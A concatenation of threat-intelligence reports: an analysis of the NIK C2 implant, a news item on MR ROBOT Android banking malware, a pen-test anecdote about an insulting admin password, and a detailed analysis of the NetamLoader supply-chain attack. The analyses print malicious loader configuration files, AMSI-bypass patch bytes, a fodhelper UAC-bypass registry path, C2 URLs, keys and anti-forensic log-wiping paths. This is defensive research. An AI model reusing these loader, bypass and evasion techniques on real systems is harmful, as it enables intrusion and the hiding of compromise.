Every message on both channels, in both directions, uses the same symmetric encryption scheme. A hardcoded seed value stored in obfuscated form in the binary data section is decoded at startup and produces a 32-byte AES key.

Decoded AES seed: d791dd0ff3228ed29a8d7333d4567be829159c5632ea347780992006f91c5295 32-byte AES key: 4887AFC0A574E9419A9695EF083460F58E4EF9A1C40793523CE112251273BDF9

The C2 server then responds with an encrypted payload, whose inner map contains a command array identical in structure to those delivered over WebSocket. Commands received through HTTP are dispatched through the same logic. If the HTTP POST fails, the agent rotates to the next server address before retrying.

Figure 11. Snippet of NIK C2 implant’s C2 communication handler function.

The result transmission to the C2 is performed by the implant when a command handler completes its operation, the result is packaged into a response envelope containing the original command's identifier, the implant's own identifier, a type string formed by appending _response to the command name, the result data payload, and a top-level type marker of "result". This object is encrypted and delivered through either directly over the WebSocket connection if it is active, or via an HTTP POST to /api/c2/result.

Implant’s defense evasion and anti-analysis techniques

The NIK C2 implant deploys a layered set of defense evasion measures that activate immediately at startup and operate across the full compromise session. On launch, It hides its console window via API ShowWindow, renames the binary to “csrss.exe” in the Windows temp directory to impersonate a legitimate system process, disables Windows Recent Documents telemetry through a registry write action, and applies a critical-process flag via API NtSetInformationProcess with the parameter value 0x1D for ProcessBreakOnTermination that causes a Blue Screen of Death if any attempt is made to terminate the process through Task Manager or taskkill actions.

Figure 12. Snippet of NIK C2 implant’s evasion handler module.

Alongside these, two anti-debug checks IsDebuggerPresent and CheckRemoteDebuggerPresent run silently and call os.Exit(0) on detection, leaving no exception record or crash evidence. When directed by the C2, the implant can also escalate privileges without a UAC prompt using the fodhelper.exe COM hijack, which writes the implant path into HKCU\Software\Classes\ms-settings\Shell\Open\command, triggers elevation, and cleans the registry key within two seconds.

The implant bypasses the Antimalware Scan Interface (AMSI) by executing a hardcoded, embedded PowerShell script that patches memory inside “System.Management.Automation.dll”. Specifically, it overwrites the AmsiInitFailed field with a six-byte stub (MOV EAX, E_INVALIDARG; RET), forcing initialization to report failure and disabling content inspection for the remaining of the PowerShell session.

Figure 13. NIK C2 Implant’s AMSI bypass PowerShell script.

Conclusion

The emergence of NIK C2, an AI-enabled command-and-control framework, underscores a critical shift in modern malware design: the transition from static intrusion toolsets to dynamic, modular implants that adapt on demand. By embedding a live AI pipeline directly into the C2 loop, the compromised host is no longer a passive foothold but an autonomous operational asset. Operators can dynamically generate context-aware lure material, execute localized deception, synthesize operational intelligence, and craft targeted payloads directly on the compromised hosts — all while lowering the technical barrier which was traditionally required for such sophisticated tradecraft.

Coverage

The following ClamAV signature detects and blocks this threat:

Win.Trojan.GoDiscorder-10060526-0

Indicators of compromise (IOCs)

IOCs for this research can be found at our GitHub repository here.

Attacks, Breaches & Threat Intel.title: MR ROBOT Malware-as-a-Service Targets Indian Bank Customers
Attacks, Breaches & Threat Intel.context: Its researchers found an operator control panel, a Telegram-based storefront and a malware builder that let affiliates create bank-themed Android trojans on demand
Attacks, Breaches & Threat Intel.full_text:
A new Android malware-as-a-service (MaaS) operation has been found renting customized banking trojans to criminals targeting Indian bank customers, with one affiliate intercepting 5407 text messages from 153 infected devices.

The operation, branded MR ROBOT by its operators, was detailed in research published on October 28 by threat intelligence firm CloudSEK. Its researchers found an operator control panel, a Telegram-based storefront and a malware builder that let affiliates create bank-themed Android trojans on demand.

The lures are distributed through fake Play Store-style pages and messaging-app links, and impersonate banks as well as utility providers and government services.

MR ROBOT Turns Banking Malware into Subscription Service

CloudSEK said MR ROBOT is not a single actor’s campaign but a multi-tenant crimeware platform. Each affiliate receives its own application ID and can generate Android packages impersonating specific Indian banks.

The platform supports a tiered reseller model with sub-admin accounts, and licenses access for set periods through a control panel identified as version 7.0.

The malware intercepts text messages carrying one-time passwords (OTPs), shows fake screens to harvest banking credentials, card details, PINs and identity information, and can silently enable call forwarding. CloudSEK said this reroutes incoming calls, including banks’ fraud-check callbacks, to a number the attackers’ control.

The storefront, a Telegram bot called APK Shield, offered around 36 lure apps, including bank impersonations and fake apps for utility bills, telecom services, traffic fines and government services.

One Affiliate Intercepted More Than 5400 Text Messages

CloudSEK tracked two affiliates. One affiliate’s panel held around 154 enrolled devices and approximately 3270 intercepted messages, while an exposed Firebase database linked to a second held 153 devices and 5407 messages.

That data was collected between July 16 and 30, 2026, and around 4000 of the messages came from bank and telecommunications short codes. CloudSEK said call forwarding was active on 58% of the devices.

Each build receives a fresh signing certificate and can hide from the Android launcher after installation. CloudSEK said MR ROBOT shares call forwarding and per-customer builders with FatBoyPanel and RedWing, operations previously documented by Zimperium, but its kit, storefront and panel had not been publicly reported.

Read more on Android banking malware: Rokarolla Trojan Combines Banking Fraud With Device Surveillance

CloudSEK advised users never to install bank-branded apps from links sent by text, WhatsApp or Telegram, and urged banks to move customers from text-message OTPs toward app-based or Fast Identity Online (FIDO) authentication where feasible.

Attacks, Breaches & Threat Intel.title: Admin dropped the F-bomb in a password to show hackers who was really 1337
Attacks, Breaches & Threat Intel.context: Welcome back to PWNED, in which The Reg offers cautionary tales from folks who’ve left their doors wide open to attackers and lived to tell the tale
Attacks, Breaches & Threat Intel.full_text: Welcome back to PWNED, in which The Reg offers cautionary tales from folks who’ve left their doors wide open to attackers and lived to tell the tale. This week’s misadventure involves unpatched older machines and a password that was supposed to send a message to crims. Our story comes courtesy once again of leading red teamer and pen tester Dahvid Schloss of Suzu Labs. A client asked Schloss to visit a factory and check the servers there for security holes. The company had been hacked six months prior, made some adjustments, and wanted to make sure that they were bulletproof now. Schloss' mission, which he chose to accept, was to get domain admin rights. Schloss drove over to the factory where he noticed a number of Windows 7 servers were connected to the CNC milling machines, even though Windows 10 was by then Microsoft's supported desktop OS. This was to be expected, as companies with proprietary software often use legacy OSes for fear of breaking apps. At first, Schloss had a hard time breaking in because most of the servers were not connected to the domain. So there was no point in his running the EternalBlue zero-day that would have let him in. “So I've been looking through these and most of them had been disconnected from the domain, so it's the right move,” he said. “Like, yeah, you could run EternalBlue on the network, but you really weren't going to be able to get anywhere with it, cuz you get on the device and what you find: you dump LSASS [the Windows Local Security Authority Subsystem Service], you’re like ‘All right, there’s local admin creds, but the local admin creds on those devices were different from the local admin creds on the majority of workstations.” Finally, Schloss went onto one of the servers that was connected to milling machines and found that it was connected to the network and on the domain. It was vulnerable to EternalBlue and he went and dumped LSASS and found a pair of creds from WDigest, one of which looked like an admin account. But Schloss thought that it must not be a legitimate admin account when he read the password : “heyhackergof***yourself,” but written in leet speak [l337 5p34k]. The resulting string was a strong password, but Schloss assumed that the admins were playing a game with him and left this credential there for him to find. Schloss assumed it wouldn't work and sat on it for a week. During a briefing he had with the IT crew, he presented his findings and then asked who set up the admin account with this funny password. “You could see everyone kind of looking at the senior manager of IT like ‘that was you, wasn’t it,’” Schloss explained. “He’s kind of got this face. I’m like ‘oh shit, like what?’ Turns out that ‘heyhackergof***yourself’ was the actual password for his admin account." On Monday, Schloss tried the username and password combo and, lo and behold, it gave him complete control of the entire network. He was then able to get access to other passwords and many of them were also insults directed at potential hackers. Schloss understood that the team was still angry about a breach they had suffered six months prior and, should they be breached again, wanted to give the finger to the hacker who did it. Unfortunately, their system was still vulnerable because of the outdated machine that was hooked up to the domain and he was able to gain control. The lesson here is really to patch your systems and avoid using insecure legacy OSes whenever possible, because it was an old machine that let Schloss in, not a weak password. Indeed, “hackergof***yourself” in leet speak isn’t a terrible password, just an embarrassing one if it's exposed. ®

Attacks, Breaches & Threat Intel.title: Unknown APT uses NetamLoader to attack a Win10 OS customized for governments in Asia
Attacks, Breaches & Threat Intel.context: The sample came to light in the first half of 2026, when Kaspersky Security Network (KSN) issued a malware detection alert for a
Attacks, Breaches & Threat Intel.full_text:
Introduction

A couple of months ago, our research revealed a highly sophisticated infection chain and a complex .NET assembly-loading framework built on XAML markup, which strongly indicates a supply-chain attack targeting a custom Windows build used exclusively by government entities in Asia. The malicious framework has been labeled NetamLoader; at present, no attribution to any known APT group has been established.

The sample came to light in the first half of 2026, when Kaspersky Security Network (KSN) issued a malware detection alert for a .config file using AppDomainManager injection to load arbitrary .NET assemblies. The file was packaged inside a CAB archive placed in the directory that stores Windows operating system update packages. Initial analysis of the CAB contents found no malicious code: most executables were legitimate components of the third-party patch management tool Patch My PC, and even the .NET assemblies used for the injection were Microsoft-signed. A later re-examination of the original .config file and the full loading process revealed the infection chain and framework described in this report.

Kaspersky’s products detect this threat as HEUR:Trojan.MSIL.NetamLoader.gen, Trojan.MSIL.Zapchast.*, and Trojan.Script.Agent.*.

Background

During routine threat hunting, KSN sent us a malware detection alert. The notification flagged a .config file that employed AppDomainManager injection to load arbitrary .NET assemblies. The file was compressed into a CAB archive named e4537a1762fcafd2fd96bfc825bad34f9db9a24d and saved in the folder that stores Windows operating system update packages. Below is the full path to this archive:

C:\Windows\SoftwareDistribution\Download\e4537a1762fcafd2fd96bfc825bad34f9db9a24d

Starting with this CAB archive, we uncovered a highly complex infection chain that uses a previously unknown advanced loading framework.

Initial infection

The CAB file contains the following seven files, which are extracted and placed in the path C:\Windows\SoftwareDistribution\Download\Install\:

Files compressed in the CAB file

Except for Resources.resx, none of the files contain malicious code. We did not observe how the CAB file was delivered to the victim; we only saw the process PatchMyPC-ScriptRunner.exe running with the following arguments:

C:\Windows\SoftwareDistribution\Download\Install\PatchMyPC-ScriptRunner.exe -updatepackage -applicationid=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx

After the file is launched in this manner, the infection chain progresses to stage 1.

Stage 1

Starting with the execution of PatchMyPC-ScriptRunner.exe, which then served as a host process for loading several payloads, we identified a complex two‑stage loading mechanism with multiple steps. The overall flow of stage 1 is summarized in the diagram below.

Infection chain: Stage 1

Step 1

The AppDomainManager injection technique is used to load an arbitrary .NET assembly. With this mechanism, when PatchMyPC-ScriptRunner.exe runs, the accompanying configuration file PatchMyPC-ScriptRunner.exe.config in the same directory is loaded before the executable’s main function runs. Below is the content of PatchMyPC‑ScriptRunner.exe.config.

<?xml version="1.0" encoding="utf-8" ?> <configuration> <runtime> <appDomainManagerType value="Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration"> </appDomainManagerType> <appDomainManagerAssembly value="Microsoft.HostIntegration.Connectors, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"> </appDomainManagerAssembly> <NGenAssemblyUsageLog enabled="0" /> </runtime> <startup> <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.6" /> </startup> </configuration>

According to the configuration file, the class Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration from the Microsoft.HostIntegration.Connectors.dll module (a Microsoft‑signed assembly) is loaded. DataCacheFactoryConfiguration is the configuration class for the Windows Server AppFabric Cache Client, specifying the settings for a new cache client. When the configuration class is loaded, its instance first attempts to find and read the default configuration file, fabric.config, located in the same directory. The contents of fabric.config are shown below:

<?xml version="1.0" encoding="utf-8"?> <section name="foo"> <customType className="System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089(Resources.resx)" /> </section>

Step 2

The DataCacheFactoryConfiguration class has a design flaw that can be abused to load arbitrary assemblies. The fabric.config file is meticulously crafted. When the file is loaded, the DataCacheFactoryConfiguration instance examines its className attribute, loads the specified type (System.Resources.ResXResourceSet from the System.Windows.Forms assembly), and creates a ResXResourceSet instance, passing “Resources.resx” to its constructor for parsing.

In the .resx file, multiple layers of payloads – including several XAML files, .NET assemblies, and JSON data – are encoded, compressed, or encrypted (see the diagram below). Each layer is unpacked and loaded by the layer above it. Once a layer finishes its operation, the next layer is extracted and loaded. Below, we analyze each layer in the order in which it is loaded:

Multiple layers of payloads are compressed and encrypted in the .resx file

The Microsoft RESX schema defines the XML layout used by .resx files, which has a human-readable structure and can hold application resources: strings, images, icons, and serialized objects. The Resources.resx file contains a Base64‑encoded binary object that was serialized using the well‑known, highly vulnerable .NET BinaryFormatter class.

Base64-encoded serialized binary object in Resources.resx

Parsing this .resx file with ResXResourceSet causes the embedded Base64‑encoded binary payload to invoke BinaryFormatter.Deserialize(), triggering a deserialization vulnerability that enables a TypeConfuseDelegate attack. The TypeConfuseDelegate then invokes XamlReader.Parse(), which loads a XAML payload (named XAML-1) embedded within the binary object.

XAML is a markup language for building user interfaces in .NET applications, but its capabilities extend far beyond that. Using two built‑in objects, ObjectDataProvider and ResourceDictionary, logic equivalent to C# code can be expressed in an XML‑like syntax.

A code snippet of XAML-1

Step 3

The XAML-1 code acts as a loader for an embedded payload. The process is as follows:

Retrieve the full command line of the current host process PatchMyPC‑ScriptRunner.exe, converting all arguments to lowercase.

Generate the AES key by hashing the command‑line string with SHA‑256.

Decode the Base64 string embedded in XAML-1 into a binary array. Use the first 16 bytes of that array as the IV, then decrypt the remaining encrypted data with AES. The decrypted output is another piece of XAML code, which we refer to as XAML-2.

Load XAML-2 into memory using the .NET API System.Windows.Markup.XamlReader.Load().

If any exception occurs during decryption, trigger Environment.Exit(0), silently terminating the host process to prevent error messages that might reveal the attack.

Stage 2

XAML‑2 initiates stage 2 of the infection. The diagram below shows the overall flow of this stage.

Infection chain: Stage 2

XAML‑2 contains two embedded Base64‑encoded sections. These sections are actually two additional XAML files (referred to as XAML-2-1 and XAML-2-2) that were first compressed with ZIP and then encoded in Base64. After decoding and decompressing, XAML-2 loads each file into memory separately with XamlReader.Load().

A code snippet of XAML-2

XAML-2-1

The first file consists of 796 lines. Its sole purpose is to hijack a key AMSI API to bypass anti‑malware scanning.

Sensitive strings in XAML-2-1 are cut into tiny pieces

To avoid detection by anti‑malware signature scans, sensitive strings are split into very short fragments. When XAML-2-1 is loaded and parsed, the fragments are reassembled into the original string.

The key steps it takes to achieve its goal are as follows:

Check the OS architecture by verifying whether IntPtr.Size equals 8. If it does not, the host process isn’t 64‑bit, so abort the hijack operation.

Combine the split strings into a single CLSID GUID (fdb00e52-a214-4aa1-8fba-4357bb0072ec), then try to create an instance of the AMSI COM object using this GUID.

Patch the AMSI module.

Create a delegate for the runtime method Console.Clear() and then obtain its native function pointer. Next, patch the method by overwriting its first bytes in memory with the binary payload (41 C7 00 01 00 00 00 33 C0 C3).

Obtain the native pointer of the AMSI COM object with Marshal.GetIUnknownForObject(). From this pointer, read the address of its virtual method table and add 0x18 to reach another pointer that holds the address of the CAmsiAntimalware::Scan method.

Use VirtualProtect() to make the Scan() pointer writable, change its value from the address of the CAmsiAntimalware::Scan() method to the address of the patched Console.Clear(), and then restore the pointer’s original protection attributes. Once this step is complete, every scan returns AMSI_RESULT_CLEAN (value = 0).

One patch targets the Console.Clear() API, which resides in the memory space of an existing legitimate module, while the other modifies only the virtual tables of the AMSI module, allowing the malware to pass code integrity checks.

XAML-2-2

XAML-2-2 consists of two parts: a .NET module (the first loader, .NET 1 Loader) and a JSON data payload (the C2 configuration, JSON-1). Both components are compressed with ZIP and then encoded in Base64. XAML-2-2 first decodes and decompresses the .NET assembly .NET 1 Loader, then uses the Assembly.CreateInstance() API to create an instance of the .NET 1 Loader and passes the Base64‑encoded JSON-1 to the m.C() method of .NET 1 Loader as a parameter.

.NET 1 Loader

.NET 1 Loader decodes, decompresses, and parses JSON‑1. The decoded and decompressed JSON‑1 is shown below:

{ "p": "[Base64‑encoded JSON, which we call JSON‑1-p]" "c": "[Base64‑encoded JSON, which we call JSON‑1-c]" }

JSON-1-c This JSON contains the configuration data that .NET 1 Loader uses to report the execution results of the loaded payload to the C2 server.

sc

false

Flag. Determines whether to report the execution result of m.C(). When set to false, reporting to C2 is skipped.

c

null

Reporting C2 server. The result returned by the m.C() method of .NET 1 Loader is sent to this server.

tp

null

Unknown item, suspected to be a trusted SSL certificate. Thumbprint was used to verify this alleged C2 certificate.

e

null

The AES key that encrypts the JSON result returned by the m.C() method of .NET 1 Loader.

JSON-1-p JSON-1-p is a more complex configuration file. .NET 1 Loader parses its data to prepare and load the subsequent stages. The following configuration keys store the payloads:

oib: Base64‑encoded .NET 2 Plugin (PE file)

oub: Base64‑encoded XAML that invokes Exit(0)

ibk: AES key used to decrypt ibi

ibi: A Base64‑encoded collection of compressed, encrypted XAML templates used to build XAML-3. Detailed instructions for decrypting and assembling XAML‑3 are provided in the XAML‑3 section below.

Other items are passed as C2 configuration to the .NET 2 Plugin at a later stage.

[ { "c": [ { "cu": "https://openaigpt4v.com/model_v4/", "tp": "*", "rh": "" } ], "mib": 79200, "mab": 100800, "mis": 1200, "mas": 2400, "e": "9fT04e03tAiZAPogcDWt0w==", "ii": null, "aop": null, "oib": "TVqQAAMAAAAEAAAA//8AALgAAAAAA...", "oub": "PFJlc291cmNlRGljdGlvbmFyeS...", "wi": 100801, "ibk": "W7BHmIRBRY3FOIfWprbW/ZJh5GbPND3sY+qCBDY7O2A=", "ibi": "4pUDtQVbD6leQrDvtT3gaaCLec...", "de": false } ]

After obtaining the configuration, .NET 1 Loader proceeds with the following key steps:

Delete the update records from the system log related to the malicious update packages, along with the malicious files and cache files used in stage 1.

Delete malicious files extracted from the CAB

PatchMyPC-ScriptRunner.exe.config fabric.config Resources.resx

Delete CLR usage logs and Windows system Prefetch cache files to eliminate evidence that could be used in forensic analysis.

%LOCALAPPDATA%\Microsoft\CLR_v4.0\UsageLogs\PatchMyPC-ScriptRunner.exe.log %WINDIR%\Prefetch\PATCHMYPC-SCRIPTRUNNER.EXE-*.pf

Retrieve the files in the folders matching the pattern 20???? at the path below, where each file name starts with “20” followed by six more characters (e.g., 20260101). Read the files’ contents, filter out any lines containing the exact substring GetExtendedUpdateInfoHandler, and write the filtered content back to the log files. The path contains the keyword CmitUpdateAgent, which may be linked to a custom Windows 10 build used by a government in Asia.

"%WINDIR%\Logs\CmitUpdateAgent\20????\20??????"

Reset a registry‑based exception‑state logging system by deleting the nine GUID keys under the path LocalMachine\SOFTWARE\Classes\appid\[specific_GUID] one at a time, along with all of their child subkeys. The algorithm that generates the GUID path is unique– it derives the GUID from the C2 URL– so each C2 server has its own distinct set of bound GUIDs. Of the nine GUIDs derived using this method, one indicates that an exception occurred, and the others are numbered 0 through 7. For example, when the malware catches exception code 129, it creates the registry subkey {bde7ddc2-1f6f-4397-a0df-ae7c7d67d65a} to indicate that an exception occurred. It then checks the bit mask, where 129 equals binary 10000001. Consequently, it creates the eighth subkey {74084115-433e-4fe8-8d01-41c48fbfeef6} and the first subkey {bf6f4bde-97db-4dcd-9546-7ebf10061519}.

Verify that each necessary configuration item exists in JSON-1-p, then validate some of its items against hardcoded values. If any item fails the check, halt the infection chain and submit the execution result to the reporting C2 server.

Verify that the current user is an administrator; if not, throw an exception with code 128.

Check whether the configuration item aop exists. If it does, Base64-decode its value, use the result as XAML-3, and skip to step 9.

Generate a unique malware instance ID for the configuration item ii by calling Guid.NewGuid().

Query the SusClientId value from the registry key SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate. Then generate the value for the newly defined configuration item si by computing a GUID using the same algorithm as above. Use the concatenation of the retrieved SusClientId value and the byte sequence \x14\x43\x9B\x64 as the input data for the algorithm.

Parse JSON-1-p, extract the relevant items and their values, and convert them to XAML format. Next, follow the steps outlined in the XAML-3 section to generate the complex XAML script XAML-3.

Create a COM instance of WScript.Shell (CLSID: 41904400-BE18-11D3-A28B-00104BD35090) and retrieve the environment of the current process. Then set the COMPlus_ETWEnabled environment variable to 0 to prevent the CLR from registering the .NET ETW provider, which hides the associated events.

Use RPC to create a remote COM object (CLSID: ab8902b4-09ca-4bb6-b78d-a8f59079a8d5). Exploit it via an unknown binary object deserialization vulnerability and the TypeConfuseDelegate technique. Once the exploit succeeds, XAML-3 is loaded into the remote host process dllhost.exe. This is a covert method for initiating a new process that loads the malicious payload XAML‑3. This technique effectively separates the infection chain from its initial process, allowing it to bypass behavioral monitoring by security solutions such as EDR.

The execution result (in JSON format, shown below) is first AES‑encrypted using the key from the item e. A randomly generated IV is prepended to the encrypted data, and the result is then Base64‑encoded.

[ { // Fixed value "_": "0202097a-5c1e-460d-b5e0-030b9756b242", // Error number: 0 indicates successful execution "e": "0 ", // Value of config "ii" "i": "94aafd58-c00c-402a-aae6-858b4486a1a4" } ]

POST the encrypted and encoded result to the reporting C2 server.

XAML-3

XAML-3 is a critical payload that, after leaving the original process tree, is loaded and executed in a different process: dllhost.exe. XAML-3 is generated from template XAML-3. As shown in the diagram below, the template is decoded and decrypted using the value of the ibi item in JSON-1-p. In addition to template XAML‑3, the final decryption includes two other XAML templates (template __P1__ and template __P2__).

The multi-layer encryption structure of “ibi”

The AES key is taken from the config item ibk. The first 16 bytes of the encrypted binary data serve as AES IV 1. After decryption, the data consists of a simple header followed by AES IV 2.

Template XAML‑3 includes two string placeholders, __P1__ and __P2__. Each placeholder is replaced with compressed, Base64‑encoded XAML (template __P1__ and XAML‑P2).

The content of template __P1__ is identical to XAML-2-1 and bypasses AMSI in the new process. XAML-P2 is generated from the template __P2__.

Some of the item values in template __P2__ come from the C2 configuration data in JSON-1-p. Within template __P2__, the placeholder __P__ is replaced with a compressed, encoded payload – the .NET 2 Plugin – which is decoded from the oib value in JSON-1-p. After completing all the operations, the template __P2__ becomes XAML-P2.

The C2 configuration in XAML‑P2 is shown below:

Item

Value

Description

ii

94aafd58-c00c-402a-aae6-858b4486a1a4

Unique ID for this malware instance (if the ii value in the configuration is null, the malware will generate a random one).

ec

9fT04e03tAiZAPogcDWt0w==

Base64-encoded AES master key: same as item e in JSON-1-p, used for C2 traffic encryption and authentication.

bi

79200-100800

Actual polling delay if the C2 doesn’t respond: 79200-100800 seconds (22-28 hours) – the code parses the values and multiplies them by 1000 to get milliseconds. This item indicates that the malware uses very long polling intervals.

is

1200-2400

Actual delay: 1200-2400 seconds (20-40 minutes) – a long delay before the initial connection to the C2 server, used for sandbox evasion.

u

Base64encodedXAML

A short XAML snippet that calls Environment.Exit(0)

wi

100801

Actual initial wait: 100801 seconds (~28 hours). The malware waits approximately 28 hours after initial execution and then exits the process.

False

Local exception logging switch: when set to False, exception logging is enabled.

41bd7f37-c3f6-4a9e-b2f3-5363e9a2c095

cu

https://openaigpt4vcom/model_v4/

Command-and-control (C2) server URL taken from the C2 server list.

tp

*

Trusted SSL certificate thumbprint: * indicates that any certificate is trusted (disabling SSL pinning/validation). This entry also appears in a list, corresponding to the C2 item cu.

rh

Additional route header/data: not configured in this instance.

When dllhost.exe loads XAML-3, it loads template __P1__ and XAML-P2 one by one. When XAML-P2 loads, it retrieves the current domain via AppDomain.GetCurrentDomain() and then stores the values of the C2 configuration items (cu, tp, and rh; see the table above) in that domain using AppDomain.SetData(). Finally, XAML-P2 decodes and decompresses the embedded payload (.NET 2 Plugin), loads the .NET 2 Plugin into the current domain, and then calls the plugin’s entry method, m.C().

.NET 2 Plugin

This payload is a .NET assembly (PE file). As discussed above, it is loaded by XAML-P2 into the host process dllhost.exe. In the plugin’s entry method m.C(), a thread is spawned to execute the malicious operations.

The following key steps are executed in this thread:

Configuration initialization: Load the C2 configuration from the current AppDomain’s data storage and assign it to the corresponding member variables.

Gather system information from the registry:

"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\full", Key="Version" "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", Key="BuildLab"

Combine the queried values into a single string, for example: "4.7.03190\n17763.rs5_release.180914-1434". If any query fails, replace its result with a hyphen (“-“).

Clear the state of the exception‑state logging system: .NET 2 Plugin uses the same exception‑state logging system as the .NET 1 Loader.

Recursively delete 12 GUID subkeys from the registry. The algorithm that generates the GUID path is the same as the one used by .NET 1 Loader. The first eight GUIDs are the same as those that .NET 1 Loader attempted to remove. The remaining four GUIDs were generated using different integer seeds (integer seed = [From 1 to 4]|65536).

If steps 1 and 2 are completed successfully, generate a subkey using the integer seed 3|65536. Then create the following registry subkey:

"LocalMachine\SOFTWARE\Classes\appid\{ff259bcd-2f0a-44de-b34a-0092fec1d8a2} DllSurrogate = ""

Anti-analysis: Check whether the current host process is dllhost.exe by examining Environment.CommandLine.

Prevent the host process from exiting: Create a managed object and retrieve its IUnknown interface. Then call ole32.dll’s CoLockObjectExternal(IUnknown interface) to lock the object in memory, ensuring that the dllhost.exe process created by RPC is not released by the system.

Jitter delay: Before the initial request to the C2 server, wait for a random jitter delay of 20-40 minutes (set by the configuration item “is”=”1200-2400”) to evade sandboxes by causing them to time out.

Set maximum execution time: Create a timer that registers a callback function as a watchdog. The timer waits approximately 28 hours (100801 seconds, retrieved from the configuration item wi) before invoking the callback. The callback fetches the configuration item u, decodes its Base64‑encoded string, decompresses the output, and extracts a XAML snippet from the resulting data. It then loads this XAML, which ultimately triggers Environment.Exit(0).

Periodic polling:

Retrieve the config items cu and ii to build the full URL https://openaigpt4v.com/model_v4/94aafd58-c00c-402a-aae6-858b4486a1a4

Obtain the system proxy using three methods (see the Discovering proxies section below).

Register an HTTPS callback (ServerCertificateValidationCallback) that verifies the server‑side X.509 certificate against the configuration value tp before establishing the connection.

Then, combine the system information with additional details, such as whether the proxy is bypassed, whether it is using a proxy, and the current index in the C2 server list.

Next, encrypt the combined data with AES (see the AES encryption diagram in the network traffic section for more details), and then encode the encrypted output in Base64.

// Final HTTP request URL "https://openaigpt4v[.]com/model_v4/94aafd58-c00c-402a-aae6-858b4486a1a4?b=lM4V3VwrWtXBy4oBGUkXOHfxyLUlrT2hIZGn4C37W1Z3%2FeW1WURJqzaNLQhGFHsWxA2lpJHZSpd8VDLMOQRD%2FfsDswnomIrBpoaNzug3dOtrh1J2KIqZRmKx1TtQsxq1RAGu1y45rSKaPHm9s2HF8A%3D%3D&c=41bd7f37-c3f6-4a9e-b2f3-5363e9a2c095"

Hijack the HTTP User-Agent and replace the value following HOST: with the config value of item rh.

Retrieve a XAML file from the C2 server, update the configuration data, and load the retrieved XAML (for more details on techniques, see the Execute downloaded XAML payload in an isolated AppDomain section).

If a valid response is received from C2, the loop pauses for 5-6 minutes before the next request; otherwise, it pauses for 22-28 hours, checking every 10 minutes to determine whether the allotted time has elapsed.

AES encryption scheme for network traffic

All traffic between the malware and the C2 server is encrypted and authenticated using AES‑128‑CBC with HMAC. The encryption and authentication keys are derived from a master key – specified in the configuration as "ec"="9fT04e03tAiZAPogcDWt0w==" – by applying HMAC with distinct seed values.

For a given master key and a single-byte seed, the derivation works as follows:

Generate a 16‑byte sequence from the seed; this serves as the HMAC key.

Compute HMAC‑SHA256 over the master key to obtain an intermediate key.

Use this intermediate key as the HMAC key to compute HMAC‑SHA256 on the constant byte 0x01.

Take the first 16 bytes of the resulting hash; this becomes the final derived key.

Accordingly, the server-side encryption and decryption keys mirror those on the client (malware) side.

Seed

Key type generated (client side)

Key type generated (server side)

0

Decryption key

Encryption key

1

Decryption authentication key

Encryption authentication key

2

Encryption key

Decryption key

3

Encryption authentication key

Decryption authentication key

The code implements an encapsulation of AES-CBC encryption combined with HMAC-SHA256 integrity verification. It uses a randomly generated IV to symmetrically encrypt the plaintext in CBC mode and produces ciphertext. Next, it calculates an SHA256 message authentication code for the concatenated “IV+ciphertext” using a separate HMAC key. Finally, it concatenates the three segments – IV (16 bytes) | ciphertext | HMAC (32 bytes) – into a single byte array that constitutes the final encrypted message. This follows the standard cryptographic Encrypt-then-MAC construction. The receiver must validate the HMAC before decrypting with the corresponding key and IV, which ensures confidentiality, integrity, and tamper resistance.

Discovering proxies

.NET 2 Plugin detects the system proxy using three methods:

Retrieve the system‑wide proxy configuration using the Win32 WinHTTP API function WinHttpGetDefaultProxyConfiguration(), then extract the proxy server with the regular expression (?:([a-zA-Z]+)=)?(.*).

If that fails, locate the running explorer.exe process, impersonate its access token using Impersonate(), and retrieve its proxy configuration with the .NET API WebProxy.GetDefaultProxy().

If both methods fail, fall back to obtaining the proxy from the .NET property DefaultWebProxy.

These methods ensure that the malware can reach external networks even in complex network environments with proxies.

Execute downloaded XAML payload in an isolated AppDomain

This technique abuses MulticastDelegate again by using reflection to modify its private _invocationList array. .NET 2 Plugin creates a multicast delegate (CrossAppDomainDelegate) and replaces one entry in its invocation list with a malicious delegate pointing to XamlReader.Parse(). When AppDomain.DoCallBack() executes this multicast delegate, it iterates through the invocation list and invokes the injected XamlReader.Parse() to parse and execute the downloaded XAML.

In more detail, the process is as follows:

Create a new isolated AppDomain with a randomly generated GUID as its name.

Copy all configuration data from the current AppDomain into the new one.

Set the proxy information in the new AppDomain and assign it to the variable px.

Use TypeConfuseDelegate to replace TimeZoneInfo.ClearCachedData() with XamlReader.Parse(), thereby modifying the MulticastDelegate(CrossAppDomainDelegate).

Use appDomain.DoCallBack() to invoke XamlReader.Parse() within the isolated AppDomain, executing the downloaded XAML payload.

Transfer any updated configuration data from the new AppDomain back to the original AppDomain.

Unload the isolated AppDomain to complete the cleanup.

This technique keeps the downloaded malicious payload out of the main AppDomain, which increases stability and allows the payload to be fully cleaned up after execution.

Infrastructure

The attack relies on commercial hosting infrastructure. The C2 IP is part of Cloudflare’s CDN, and the domain name is registered with Cloudflare.

Domain

IP

First seen

Domain Registrar/ASN

openaigpt4v[.]com

104.18.14[.]219

Sep 27, 2023

Cloudflare, Inc. / 15169

Victims

Based on KSN telemetry data, we identified a single victim in Asia. Additionally, we learned that the malware was designed to target a specially customized government‑only version of the Windows operating system. Consequently, we infer that the victims are Asian government entities.

Attribution

After analyzing the TTPs, code similarities, and infrastructure, we were unable to link the attack to any known APT group.

Conclusions

Technological sovereignty has become a global trend. In today’s geopolitical climate, a growing number of countries are building their own core software platforms, including operating systems, databases, middleware, and cloud services, with operating systems often the top priority. The advantage is that each country controls the development, operation, and upgrading of its own operating systems, granting it full autonomy over the entire process. On the other hand, it also means that each country must protect this entire vast ecosystem on its own. Bringing the operation and maintenance of such a system to maturity is a lengthy process. Until then, both the system and its emerging supply chain could be exposed to attacks through multiple vectors, increasing potential vulnerabilities.

